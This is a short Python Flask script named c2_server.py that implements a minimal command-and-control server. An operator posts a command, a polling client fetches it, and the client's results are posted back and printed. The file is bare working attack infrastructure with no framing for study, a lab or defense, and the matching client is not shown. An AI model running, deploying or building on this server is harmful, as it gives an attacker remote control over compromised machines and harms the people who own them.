# c2_server.py
from flask import Flask, request, jsonify

app = Flask(__name__)

# Store the command that should be sent to the client
command_to_send = ""

@app.route('/command', methods=['GET'])
def get_command():
    global command_to_send
    response = {'command': command_to_send}
    command_to_send = ""  # Clear the command once sent
    return jsonify(response)

@app.route('/result', methods=['POST'])
def receive_result():
    data = request.json
    print(f"Client result: {data['result']}")
    return jsonify({'status': 'ok'})

@app.route('/set_command', methods=['POST'])
def set_command():
    global command_to_send
    data = request.json
    command_to_send = data['command']
    print(f"Command set: {command_to_send}")
    return jsonify({'status': 'command set'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
